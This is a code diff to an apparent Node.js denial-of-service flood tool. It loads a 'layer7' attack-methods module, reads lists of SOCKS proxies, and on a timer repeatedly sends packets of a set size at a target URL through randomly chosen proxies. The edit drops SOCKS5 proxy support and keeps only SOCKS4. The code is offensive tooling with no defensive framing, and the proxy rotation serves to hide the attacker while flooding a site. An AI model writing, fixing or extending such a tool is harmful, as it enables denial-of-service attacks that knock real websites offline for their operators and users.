@@ -4,7 +4,6 @@ const { SocksClient } = require('socks');
 const layer7 = require('./methods/layer7');
 
 const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
-const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
 
 async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
     return new Promise((resolve, reject) => {
@@ -15,7 +14,7 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
             proxy: {
                 ipaddress: proxyIp,
                 port: parseInt(proxyPort),
-                type: socks4Proxies.includes(proxy) ? 4 : 5, 
+                type: 4, 
             },
             destination: {
                 host: target.hostname,
@@ -67,8 +66,7 @@ async function sendPacket(targetUrl, proxy, delay, kbSize, method) {
 
 function start(targetUrl, delay, kbSize, method) {
     setInterval(() => {
-        const proxyList = Math.random() < 0.5 ? socks4Proxies : socks5Proxies;
-        const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
+        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];
 
         sendPacket(targetUrl, proxy, delay, kbSize, method).catch((err) => {
             if (err.code === 'ECONNRESET' || err.code === 'ECONNREFUSED') {
@@ -77,7 +75,7 @@ function start(targetUrl, delay, kbSize, method) {
                 console.error(`Error with ${proxy}: ${err.message}`);
             }
         });
-    }, delay);
+    }, delay); 
 }
 
 module.exports = { start };
